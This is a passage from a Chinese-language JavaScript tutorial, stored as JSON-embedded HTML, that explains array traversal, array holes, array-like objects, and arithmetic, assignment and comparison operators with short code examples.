console.log(a[i]);\n}\n// 1\n// 2\n// 3</code></pre><p>但是，<code>for...in</code>不仅会遍历数组所有的数字键，还会遍历非数字键。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\na.foo = true;\n\nfor (var key in a) {\n  console.log(key);\n}\n// 0\n// 1\n// 2\n// foo</code></pre><p>上面代码在遍历数组时，也遍历到了非整数键<code>foo</code>。所以，不推荐使用<code>for...in</code>遍历数组。</p>\n<p>数组的遍历可以考虑使用<code>for</code>循环或<code>while</code>循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\n\n// for循环\nfor(var i = 0; i &lt; a.length; i++) {\n  console.log(a[i]);\n}\n\n// while循环\nvar i = 0;\nwhile (i &lt; a.length) {\n  console.log(a[i]);\n  i++;\n}\n\nvar l = a.length;\nwhile (l--) {\n  console.log(a[l]);\n}</code></pre><p>上面代码是三种遍历数组的写法。最后一种写法是逆向遍历，即从最后一个元素向第一个元素遍历。</p>\n<p>数组的<code>forEach</code>方法，也可以用来遍历数组，详见《标准库》的 Array 对象一章。</p>\n<pre class=\"prettyprint language-javascript\"><code>var colors = [&#039;red&#039;, &#039;green&#039;, &#039;blue&#039;];\ncolors.forEach(function (color) {\n  console.log(color);\n});\n// red\n// green\n// blue</code></pre>\n        <h2>\n            <a href='#数组的空位' class='header-anchor'>#</a>\n            <span>数组的空位</span>\n        </h2>\n    <p>当数组的某个位置是空元素，即两个逗号之间没有任何值，我们称该数组存在空位（hole）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, , 1];\na.length // 3</code></pre><p>上面代码表明，数组的空位不影响<code>length</code>属性。</p>\n<p>需要注意的是，如果最后一个元素后面有逗号，并不会产生空位。也就是说，有没有这个逗号，结果都是一样的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3,];\n\na.length // 3\na // [1, 2, 3]</code></pre><p>上面代码中，数组最后一个成员后面有一个逗号，这不影响<code>length</code>属性的值，与没有这个逗号时效果一样。</p>\n<p>数组的空位是可以读取的，返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [, , ,];\na[1] // undefined</code></pre><p>使用<code>delete</code>命令删除一个数组成员，会形成空位，并且不会影响<code>length</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\ndelete a[1];\n\na[1] // undefined\na.length // 3</code></pre><p>上面代码用<code>delete</code>命令删除了数组的第二个元素，这个位置就形成了空位，但是对<code>length</code>属性没有影响。也就是说，<code>length</code>属性不过滤空位。所以，使用<code>length</code>属性进行数组遍历，一定要非常小心。</p>\n<p>数组的某个位置是空位，与某个位置是<code>undefined</code>，是不一样的。如果是空位，使用数组的<code>forEach</code>方法、<code>for...in</code>结构、以及<code>Object.keys</code>方法进行遍历，空位都会被跳过。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [, , ,];\n\na.forEach(function (x, i) {\n  console.log(i + &#039;. &#039; + x);\n})\n// 不产生任何输出\n\nfor (var i in a) {\n  console.log(i);\n}\n// 不产生任何输出\n\nObject.keys(a)\n// []</code></pre><p>如果某个位置是<code>undefined</code>，遍历的时候就不会被跳过。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [undefined, undefined, undefined];\n\na.forEach(function (x, i) {\n  console.log(i + &#039;. &#039; + x);\n});\n// 0. undefined\n// 1. undefined\n// 2. undefined\n\nfor (var i in a) {\n  console.log(i);\n}\n// 0\n// 1\n// 2\n\nObject.keys(a)\n// [&#039;0&#039;, &#039;1&#039;, &#039;2&#039;]</code></pre><p>这就是说，空位就是数组没有这个元素，所以不会被遍历到，而<code>undefined</code>则表示数组有这个元素，值是<code>undefined</code>，所以遍历不会跳过。</p>\n\n        <h2>\n            <a href='#类似数组的对象' class='header-anchor'>#</a>\n            <span>类似数组的对象</span>\n        </h2>\n    <p>如果一个对象的所有键名都是正整数或零，并且有<code>length</code>属性，那么这个对象就很像数组，语法上称为“类似数组的对象”（array-like object）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  0: &#039;a&#039;,\n  1: &#039;b&#039;,\n  2: &#039;c&#039;,\n  length: 3\n};\n\nobj[0] // &#039;a&#039;\nobj[1] // &#039;b&#039;\nobj.length // 3\nobj.push(&#039;d&#039;) // TypeError: obj.push is not a function</code></pre><p>上面代码中，对象<code>obj</code>就是一个类似数组的对象。但是，“类似数组的对象”并不是数组，因为它们不具备数组特有的方法。对象<code>obj</code>没有数组的<code>push</code>方法，使用该方法就会报错。</p>\n<p>“类似数组的对象”的根本特征，就是具有<code>length</code>属性。只要有<code>length</code>属性，就可以认为这个对象类似于数组。但是有一个问题，这种<code>length</code>属性不是动态值，不会随着成员的变化而变化。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  length: 0\n};\nobj[3] = &#039;d&#039;;\nobj.length // 0</code></pre><p>上面代码为对象<code>obj</code>添加了一个数字键，但是<code>length</code>属性没变。这就说明了<code>obj</code>不是数组。</p>\n<p>典型的“类似数组的对象”是函数的<code>arguments</code>对象，以及大多数 DOM 元素集，还有字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>// arguments对象\nfunction args() { return arguments }\nvar arrayLike = args(&#039;a&#039;, &#039;b&#039;);\n\narrayLike[0] // &#039;a&#039;\narrayLike.length // 2\narrayLike instanceof Array // false\n\n// DOM元素集\nvar elts = document.getElementsByTagName(&#039;h3&#039;);\nelts.length // 3\nelts instanceof Array // false\n\n// 字符串\n&#039;abc&#039;[1] // &#039;b&#039;\n&#039;abc&#039;.length // 3\n&#039;abc&#039; instanceof Array // false</code></pre><p>上面代码包含三个例子，它们都不是数组（<code>instanceof</code>运算符返回<code>false</code>），但是看上去都非常像数组。</p>\n<p>数组的<code>slice</code>方法可以将“类似数组的对象”变成真正的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = Array.prototype.slice.call(arrayLike);</code></pre><p>除了转为真正的数组，“类似数组的对象”还有一个办法可以使用数组的方法，就是通过<code>call()</code>把数组的方法放到对象上面。</p>\n<pre class=\"prettyprint language-javascript\"><code>function print(value, index) {\n  console.log(index + &#039; : &#039; + value);\n}\n\nArray.prototype.forEach.call(arrayLike, print);</code></pre><p>上面代码中，<code>arrayLike</code>代表一个类似数组的对象，本来是不可以使用数组的<code>forEach()</code>方法的，但是通过<code>call()</code>，可以把<code>forEach()</code>嫁接到<code>arrayLike</code>上面调用。</p>\n<p>下面的例子就是通过这种方法，在<code>arguments</code>对象上面调用<code>forEach</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>// forEach 方法\nfunction logArgs() {\n  Array.prototype.forEach.call(arguments, function (elem, i) {\n    console.log(i + &#039;. &#039; + elem);\n  });\n}\n\n// 等同于 for 循环\nfunction logArgs() {\n  for (var i = 0; i &lt; arguments.length; i++) {\n    console.log(i + &#039;. &#039; + arguments[i]);\n  }\n}</code></pre><p>字符串也是类似数组的对象，所以也可以用<code>Array.prototype.forEach.call</code>遍历。</p>\n<pre class=\"prettyprint language-javascript\"><code>Array.prototype.forEach.call(&#039;abc&#039;, function (chr) {\n  console.log(chr);\n});\n// a\n// b\n// c</code></pre><p>注意，这种方法比直接使用数组原生的<code>forEach</code>要慢，所以最好还是先将“类似数组的对象”转为真正的数组，然后再直接调用数组的<code>forEach</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = Array.prototype.slice.call(&#039;abc&#039;);\narr.forEach(function (chr) {\n  console.log(chr);\n});\n// a\n// b\n// c</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/12/arrays.html\">Arrays in JavaScript</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/06/dense-arrays.html\">JavaScript: sparse arrays vs. dense arrays</a></li>\n<li>Felix Bohm, <a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/what-they-didnt-tell-you-about-es5s-array-extras/\">What They Didn’t Tell You About ES5′s Array Extras</a></li>\n<li>Juriy Zaytsev, <a href=\"http://perfectionkills.com/how-ecmascript-5-still-does-not-allow-to-subclass-an-array/\">How ECMAScript 5 still does not allow to subclass an array</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"算术运算符","link":"/operators/arithmetic.html"}],"content":"\n        <h1>\n            <a href='#算术运算符' class='header-anchor'>#</a>\n            <span>算术运算符</span>\n        </h1>\n    <p>运算符是处理数据的基本方法，用来从现有的值得到新的值。JavaScript 提供了多种运算符，覆盖了所有主要的运算。</p>\n\n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 共提供10个算术运算符，用来完成基本的算术运算。</p>\n<ul>\n<li><strong>加法运算符</strong>：<code>x + y</code></li>\n<li><strong>减法运算符</strong>： <code>x - y</code></li>\n<li><strong>乘法运算符</strong>： <code>x * y</code></li>\n<li><strong>除法运算符</strong>：<code>x / y</code></li>\n<li><strong>指数运算符</strong>：<code>x ** y</code></li>\n<li><strong>余数运算符</strong>：<code>x % y</code></li>\n<li><strong>自增运算符</strong>：<code>++x</code> 或者 <code>x++</code></li>\n<li><strong>自减运算符</strong>：<code>--x</code> 或者 <code>x--</code></li>\n<li><strong>数值运算符</strong>： <code>+x</code></li>\n<li><strong>负数值运算符</strong>：<code>-x</code></li>\n</ul>\n<p>减法、乘法、除法运算法比较单纯，就是执行相应的数学运算。下面介绍其他几个算术运算符，重点是加法运算符。</p>\n\n        <h2>\n            <a href='#加法运算符' class='header-anchor'>#</a>\n            <span>加法运算符</span>\n        </h2>\n    \n        <h3>\n            <a href='#基本规则' class='header-anchor'>#</a>\n            <span>基本规则</span>\n        </h3>\n    <p>加法运算符（<code>+</code>）是最常见的运算符，用来求两个数值的和。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 + 1 // 2</code></pre><p>JavaScript 允许非数值的相加。</p>\n<pre class=\"prettyprint language-javascript\"><code>true + true // 2\n1 + true // 2</code></pre><p>上面代码中，第一行是两个布尔值相加，第二行是数值与布尔值相加。这两种情况，布尔值都会自动转成数值，然后再相加。</p>\n<p>比较特殊的是，如果是两个字符串相加，这时加法运算符会变成连接运算符，返回一个新的字符串，将两个原字符串连接在一起。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a&#039; + &#039;bc&#039; // &quot;abc&quot;</code></pre><p>如果一个运算子是字符串，另一个运算子是非字符串，这时非字符串会转成字符串，再连接在一起。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 + &#039;a&#039; // &quot;1a&quot;\nfalse + &#039;a&#039; // &quot;falsea&quot;</code></pre><p>加法运算符是在运行时决定，到底是执行相加，还是执行连接。也就是说，运算子的不同，导致了不同的语法行为，这种现象称为“重载”（overload）。由于加法运算符存在重载，可能执行两种运算，使用的时候必须很小心。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;3&#039; + 4 + 5 // &quot;345&quot;\n3 + 4 + &#039;5&#039; // &quot;75&quot;</code></pre><p>上面代码中，由于从左到右的运算次序，字符串的位置不同会导致不同的结果。</p>\n<p>除了加法运算符，其他算术运算符（比如减法、除法和乘法）都不会发生重载。它们的规则是：所有运算子一律转为数值，再进行相应的数学运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 - &#039;2&#039; // -1\n1 * &#039;2&#039; // 2\n1 / &#039;2&#039; // 0.5</code></pre><p>上面代码中，减法、除法和乘法运算符，都是将字符串自动转为数值，然后再运算。</p>\n\n        <h3>\n            <a href='#对象的相加' class='header-anchor'>#</a>\n            <span>对象的相加</span>\n        </h3>\n    <p>如果运算子是对象，必须先转成原始类型的值，然后再相加。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nobj + 2 // &quot;[object Object]2&quot;</code></pre><p>上面代码中，对象<code>obj</code>转成原始类型的值是<code>[object Object]</code>，再加<code>2</code>就得到了上面的结果。</p>\n<p>对象转成原始类型的值，规则如下。</p>\n<p>首先，自动调用对象的<code>valueOf</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nobj.valueOf() // { p: 1 }</code></pre><p>一般来说，对象的<code>valueOf</code>方法总是返回对象自身，这时再自动调用对象的<code>toString</code>方法，将其转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nobj.valueOf().toString() // &quot;[object Object]&quot;</code></pre><p>对象的<code>toString</code>方法默认返回<code>[object Object]</code>，所以就得到了最前面那个例子的结果。</p>\n<p>知道了这个规则以后，就可以自己定义<code>valueOf</code>方法或<code>toString</code>方法，得到想要的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  valueOf: function () {\n    return 1;\n  }\n};\n\nobj + 2 // 3</code></pre><p>上面代码中，我们定义<code>obj</code>对象的<code>valueOf</code>方法返回<code>1</code>，于是<code>obj + 2</code>就得到了<code>3</code>。这个例子中，由于<code>valueOf</code>方法直接返回一个原始类型的值，所以不再调用<code>toString</code>方法。</p>\n<p>下面是自定义<code>toString</code>方法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  toString: function () {\n    return &#039;hello&#039;;\n  }\n};\n\nobj + 2 // &quot;hello2&quot;</code></pre><p>上面代码中，对象<code>obj</code>的<code>toString</code>方法返回字符串<code>hello</code>。前面说过，只要有一个运算子是字符串，加法运算符就变成连接运算符，返回连接后的字符串。</p>\n<p>这里有一个特例，如果运算子是一个<code>Date</code>对象的实例，那么会优先执行<code>toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Date();\nobj.valueOf = function () { return 1 };\nobj.toString = function () { return &#039;hello&#039; };\n\nobj + 2 // &quot;hello2&quot;</code></pre><p>上面代码中，对象<code>obj</code>是一个<code>Date</code>对象的实例，并且自定义了<code>valueOf</code>方法和<code>toString</code>方法，结果<code>toString</code>方法优先执行。</p>\n\n        <h2>\n            <a href='#余数运算符' class='header-anchor'>#</a>\n            <span>余数运算符</span>\n        </h2>\n    <p>余数运算符（<code>%</code>）返回前一个运算子被后一个运算子除，所得的余数。</p>\n<pre class=\"prettyprint language-javascript\"><code>12 % 5 // 2</code></pre><p>需要注意的是，运算结果的正负号由第一个运算子的正负号决定。</p>\n<pre class=\"prettyprint language-javascript\"><code>-1 % 2 // -1\n1 % -2 // 1</code></pre><p>所以，为了得到负数的正确余数值，可以先使用绝对值函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 错误的写法\nfunction isOdd(n) {\n  return n % 2 === 1;\n}\nisOdd(-5) // false\nisOdd(-4) // false\n\n// 正确的写法\nfunction isOdd(n) {\n  return Math.abs(n % 2) === 1;\n}\nisOdd(-5) // true\nisOdd(-4) // false</code></pre><p>余数运算符还可以用于浮点数的运算。但是，由于浮点数不是精确的值，无法得到完全准确的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>6.5 % 2.1\n// 0.19999999999999973</code></pre>\n        <h2>\n            <a href='#自增和自减运算符' class='header-anchor'>#</a>\n            <span>自增和自减运算符</span>\n        </h2>\n    <p>自增和自减运算符，是一元运算符，只需要一个运算子。它们的作用是将运算子首先转为数值，然后加上1或者减去1。它们会修改原始变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n++x // 2\nx // 2\n\n--x // 1\nx // 1</code></pre><p>上面代码的变量<code>x</code>自增后，返回<code>2</code>，再进行自减，返回<code>1</code>。这两种情况都会使得，原始变量<code>x</code>的值发生改变。</p>\n<p>运算之后，变量的值发生变化，这种效应叫做运算的副作用（side effect）。自增和自减运算符是仅有的两个具有副作用的运算符，其他运算符都不会改变变量的值。</p>\n<p>自增和自减运算符有一个需要注意的地方，就是放在变量之后，会先返回变量操作前的值，再进行自增/自减操作；放在变量之前，会先进行自增/自减操作，再返回变量操作后的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar y = 1;\n\nx++ // 1\n++y // 2</code></pre><p>上面代码中，<code>x</code>是先返回当前值，然后自增，所以得到<code>1</code>；<code>y</code>是先自增，然后返回新的值，所以得到<code>2</code>。</p>\n\n        <h2>\n            <a href='#数值运算符，负数值运算符' class='header-anchor'>#</a>\n            <span>数值运算符，负数值运算符</span>\n        </h2>\n    <p>数值运算符（<code>+</code>）同样使用加号，但它是一元运算符（只需要一个操作数），而加法运算符是二元运算符（需要两个操作数）。</p>\n<p>数值运算符的作用在于可以将任何值转为数值（与<code>Number</code>函数的作用相同）。</p>\n<pre class=\"prettyprint language-javascript\"><code>+true // 1\n+[] // 0\n+{} // NaN</code></pre><p>上面代码表示，非数值经过数值运算符以后，都变成了数值（最后一行<code>NaN</code>也是数值）。具体的类型转换规则，参见《数据类型转换》一章。</p>\n<p>负数值运算符（<code>-</code>），也同样具有将一个值转为数值的功能，只不过得到的值正负相反。连用两个负数值运算符，等同于数值运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n-x // -1\n-(-x) // 1</code></pre><p>上面代码最后一行的圆括号不可少，否则会变成自减运算符。</p>\n<p>数值运算符号和负数值运算符，都会返回一个新的值，而不会改变原始变量的值。</p>\n\n        <h2>\n            <a href='#指数运算符' class='header-anchor'>#</a>\n            <span>指数运算符</span>\n        </h2>\n    <p>指数运算符（<code>**</code>）完成指数运算，前一个运算子是底数，后一个运算子是指数。</p>\n<pre class=\"prettyprint language-javascript\"><code>2 ** 4 // 16</code></pre>\n        <h2>\n            <a href='#赋值运算符' class='header-anchor'>#</a>\n            <span>赋值运算符</span>\n        </h2>\n    <p>赋值运算符（Assignment Operators）用于给变量赋值。</p>\n<p>最常见的赋值运算符，当然就是等号（<code>=</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 将 1 赋值给变量 x\nvar x = 1;\n\n// 将变量 y 的值赋值给变量 x\nvar x = y;</code></pre><p>赋值运算符还可以与其他运算符结合，形成变体。下面是与算术运算符的结合。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 x = x + y\nx += y\n\n// 等同于 x = x - y\nx -= y\n\n// 等同于 x = x * y\nx *= y\n\n// 等同于 x = x / y\nx /= y\n\n// 等同于 x = x % y\nx %= y\n\n// 等同于 x = x ** y\nx **= y</code></pre><p>下面是与位运算符的结合（关于位运算符，请见后文的介绍）。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 x = x &gt;&gt; y\nx &gt;&gt;= y\n\n// 等同于 x = x &lt;&lt; y\nx &lt;&lt;= y\n\n// 等同于 x = x &gt;&gt;&gt; y\nx &gt;&gt;&gt;= y\n\n// 等同于 x = x &amp; y\nx &amp;= y\n\n// 等同于 x = x | y\nx |= y\n\n// 等同于 x = x ^ y\nx ^= y</code></pre><p>这些复合的赋值运算符，都是先进行指定运算，然后将得到值返回给左边的变量。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"比较运算符","link":"/operators/comparison.html"}],"content":"\n        <h1>\n            <a href='#比较运算符' class='header-anchor'>#</a>\n            <span>比较运算符</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>比较运算符用于比较两个值的大小，然后返回一个布尔值，表示是否满足指定的条件。</p>\n<pre class=\"prettyprint language-javascript\"><code>2 &gt; 1 // true</code></pre><p>上面代码比较<code>2</code>是否大于<code>1</code>，返回<code>true</code>。</p>\n<blockquote>\n<p>注意，比较运算符可以比较各种类型的值，不仅仅是数值。</p>\n</blockquote>\n<p>JavaScript 一共提供了8个比较运算符。</p>\n<ul>\n<li><code>&gt;</code> 大于运算符</li>\n<li><code>&lt;</code> 小于运算符</li>\n<li><code>&lt;=</code> 小于或等于运算符</li>\n<li><code>&gt;=</code> 大于或等于运算符</li>\n<li><code>==</code> 相等运算符</li>\n<li><code>===</code> 严格相等运算符</li>\n<li><code>!=</code> 不相等运算符</li>\n<li><code>!==</code> 严格不相等运算符</li>\n</ul>\n<p>这八个比较运算符分成两类：相等比较和非相等比较。两者的规则是不一样的，对于非相等的比较，算法是先看两个运算子是否都是字符串，如果是的，就按照字典顺序比较（实际上是比较 Unicode 码点）；否则，将两个运算子都转成数值，再比较数值的大小。</p>\n\n        <h2>\n            <a href='#非相等运算符：字符串的比较' class='header-anchor'>#</a>\n            <span>非相等运算符：字符串的比较</span>\n        </h2>\n    <p>字符串按照字典顺序进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat&#039; &gt; &#039;dog&#039; // false\n&#039;cat&#039; &gt; &#039;catalog&#039; // false</code></pre><p>JavaScript 引擎内部首先比较首字符的 Unicode 码点。如果相等，再比较第二个字符的 Unicode 码点，以此类推。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat&#039; &gt; &#039;Cat&#039; // true&#039;</code></pre><p>上面代码中，小写的<code>c</code>的 Unicode 码点（<code>99</code>）大于大写的<code>C</code>的 Unicode 码点（<code>67</code>），所以返回<code>true</code>。</p>\n<p>由于所有字符都有 Unicode 码点，因此汉字也可以比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;大&#039; &gt; &#039;小&#039; // false</code></pre><p>上面代码中，“大”的 Unicode 码点是22823，“小”是23567，因此返回<code>false</code>。</p>\n\n        <h2>\n            <a href='#非相等运算符：非字符串的比较' class='header-anchor'>#</a>\n            <span>非相等运算符：非字符串的比较</span>\n        </h2>\n    <p>如果两个运算子都不是字符串，分成以下三种情况。</p>\n<p><strong>（1）原始类型值</strong></p>\n<p>如果两个运算子都是原始类型的值，则是先转成数值再比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 &gt; &#039;4&#039; // true\n// 等同于 5 &gt; Number(&#039;4&#039;)\n// 即 5 &gt; 4\n\ntrue &gt; false // true\n// 等同于 Number(true) &gt; Number(false)\n// 即 1 &gt; 0\n\n2 &gt; true // true\n// 等同于 2 &gt; Number(true)\n// 即 2 &gt; 1</code></pre><p>上面代码中，字符串和布尔值都会先转成数值，再进行比较。</p>\n<p>任何值（包括<code>NaN</code>本身）与<code>NaN</code>比较，返回的都是<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 &gt; NaN // false\n1 &lt;= NaN // false\n&#039;1&#039; &gt; NaN // false\n&#039;1&#039; &lt;= NaN // false\nNaN &gt; NaN // false\nNaN &lt;= NaN // false</code></pre><p><strong>（2）对象</strong></p>\n<p>如果运算子是对象，会转为原始类型的值，再进行比较。</p>\n<p>对象转换成原始类型的值，算法是先调用<code>valueOf</code>方法；如果返回的还是对象，再接着调用<code>toString</code>方法，详细解释参见《数据类型的转换》一章。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = [2];\nx &gt; &#039;11&#039; // true\n// 等同于 [2].valueOf().toString() &gt; &#039;11&#039;\n// 即 &#039;2&#039; &gt; &#039;11&#039;\n\nx.valueOf = function () { return &#039;1&#039; };\nx &gt; &#039;11&#039; // false\n// 等同于 [2].valueOf() &gt; &#039;11&#039;\n// 即 &#039;1&#039; &gt; &#039;11&#039;</code></pre><p>两个对象之间的比较也是如此。</p>\n<pre class=\"prettyprint language-javascript\"><code>[2] &gt; [1] // true\n// 等同于 [2].valueOf().toString() &gt; [1].valueOf().toString()\n// 即 &#039;2&#039; &gt; &#039;1&#039;\n\n[2] &gt; [11] // true\n// 等同于 [2].valueOf().toString() &gt; [11].valueOf().toString()\n// 即 &#039;2&#039; &gt; &#039;11&#039;\n\n{ x: 2 } &gt;= { x: 1 } // true\n// 等同于 { x: 2 }.valueOf().toString() &gt;= { x: 1 }.valueOf().toString()\n// 即 &#039;[object Object]&#039; &gt;= &#039;[object Object]&#039;</code></pre>\n        <h2>\n            <a href='#严格相等运算符' class='header-anchor'>#</a>\n            <span>严格相等运算符</span>\n        </h2>\n    <p>JavaScript 提供两种相等运算符：<code>==</code>和<code>===</code>。</p>\n<p>简单说，它们的区别是相等运算符（<code>==</code>）比较两个值是否相等，严格相等运算符（<code>===</code>）比较它们是否为“同一个值”。如果两个值不是同一类型，严格相等运算符（<code>===</code>）直接返回<code>false</code>，而相等运算符（<code>==</code>）会将它们转换成同一个类型，再用严格相等运算符进行比较。</p>\n<p>本节介绍严格相等运算符的算法。</p>\n<p><strong>（1）不同类型的值</strong></p>\n<p>如果两个值的类型不同，直接返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 === &quot;1&quot; // false\ntrue === &quot;true&quot; // false</code></pre><p>上面代码比较数值的<code>1</code>与字符串的“1”、布尔值的<code>true</code>与字符串<code>&quot;true&quot;</code>，因为类型不同，结果都是<code>false</code>。</p>\n<p><strong>（2）同一类的原始类型值</strong></p>\n<p>同一类型的原始类型的值（数值、字符串、布尔值）比较时，值相同就返回<code>true</code>，值不同就返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 === 0x1 // true</code></pre><p>上面代码比较十进制的<code>1</code>与十六进制的<code>1</code>，因为类型和值都相同，返回<code>true</code>。</p>\n<p>需要注意的是，<code>NaN</code>与任何值都不相等（包括自身）。另外，正<code>0</code>等于负<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>NaN === NaN  // false\n+0 === -0 // true</code></pre><p><strong>（3）复合类型值</strong></p>\n<p>两个复合类型（对象、数组、函数）的数据比较时，不是比较它们的值是否相等，而是比较它们是否指向同一个地址。</p>\n<pre class=\"prettyprint language-javascript\"><code>{} === {} // false\n[] === [] // false\n(function () {} === function () {}) // false</code></pre><p>上面代码分别比较两个空对象、两个空数组、两个空函数，结果都是不相等。原因是对于复合类型的值，严格相等运算比较的是，它们是否引用同一个内存地址，而运算符两边的空对象、空数组、空函数的值，都存放在不同的内存地址，结果当然是<code>false</code>。</p>\n<p>如果两个变量引用同一个对象，则它们相等。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v1 = {};\nvar v2 = v1;\nv1 === v2 // true</code></pre><p>注意，对于两个对象的比较，严格相等运算符比较的是地址，而大于或小于运算符比较的是值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj1 = {};\nvar obj2 = {};\n\nobj1 &gt; obj2 // false\nobj1 &lt; obj2 // false\nobj1 === obj2 // false</code></pre><p>上面的三个比较，前两个比较的是值，最后一个比较的是地址，所以都返回<code>false</code>。</p>\n<p><strong>（4）undefined 和 null</strong></p>\n<p><code>undefined</code>和<code>null</code>与自身严格相等。</p>\n<pre class=\"prettyprint language-javascript\"><code>undefined === undefined // true\nnull === null // true</code></pre><p>由于变量声明后默认值是<code>undefined</code>，因此两个只声明未赋值的变量是相等的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v1;\nvar v2;\nv1 === v2 // true</code></pre>\n        <h2>\n            <a href='#严格不相等运算符' class='header-anchor'>#</a>\n            <span>严格不相等运算符</span>\n        </h2>\n    <p>严格相等运算符有一个对应的“严格不相等运算符”（<code>!==</code>），它的算法就是先求严格相等运算符的结果，然后返回相反值。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 !== &#039;1&#039; // true\n// 等同于\n!(1 === &#039;1&#039;)</code></pre><p>上面代码中，感叹号<code>!</code>是求出后面表达式的相反值。</p>\n\n        <h2>\n            <a href='#相等运算符' class='header-anchor'>#</a>\n            <span>相等运算符</span>\n        </h2>\n    <p>相等运算符用来比较相同类型的数据时，与严格相等运算符完全一样。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 == 1.0\n// 等同于\n1 === 1.0</code></pre><p>比较不同类型的数据时，相等运算符会先将数据进行类型转换，然后再用严格相等运算符比较。类型转换规则如下。</p>\n<p><strong>（1）原始类型值</strong></p>\n<p>原始类型的值会转换成数值再进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 == true // true\n// 等同于 1 === Number(true)\n\n0 == false // true\n// 等同于 0 === Number(false)\n\n2 == true // false\n// 等同于 2 === Number(true)\n\n2 == false // false\n// 等同于 2 === Number(false)\n\n&#039;true&#039; == true // false\n// 等同于 Number(&#039;true&#039;) === Number(true)\n// 等同于 NaN === 1\n\n&#039;&#039; == 0 // true\n// 等同于 Number(&#039;&#039;) === 0\n// 等同于 0 === 0\n\n&#039;&#039; == false  // true\n// 等同于 Number(&#039;&#039;) === Number(false)\n// 等同于 0 === 0\n\n&#039;1&#039; == true  // true\n// 等同于 Number(&#039;1&#039;) === Number(true)\n// 等同于 1 === 1\n\n&#039;\\n  123  \\t&#039; == 123 // true\n// 因为字符串转为数字时，省略前置和后置的空格</code></pre><p>上面代码将字符串和布尔值都转为数值，然后再进行比较。具体的字符串与布尔值的类型转换规则，参见《数据类型转换》一章。</p>\n<p><strong>（2）对象与原始类型值比较</strong></p>\n<p>对象（这里指广义的对象，包括数组和函数）与原始类型的值比较时，对象转换成原始类型的值，再进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1] == 1 // true\n// 等同于 Number([1]) == 1\n\n[1] == &#039;1&#039; // true\n// 等同于 Number([1]) == Number(&#039;1&#039;)\n\n[1] == true // true\n// 等同于 Number([1]) == Number(true)</code></pre><p>上面代码中，数组<code>[1]</code>与数值进行比较，会先转成数值，再进行比较；与字符串进行比较，会先转成数值，再与字符串进行比较，然后字符串也会转成数值；与布尔值进行比较，两个运算子都会先转成数值，然后再进行比较。</p>\n<p><strong>（3）undefined 和 null</strong></p>\n<p><code>undefined</code>和<code>null</code>与其他类型的值比较时，结果都为<code>false</code>，它们互相比较时结果为<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>false == null // false\nfalse == undefined // false\n\n0 == null // false\n0 == undefined // false\n\nundefined == null // 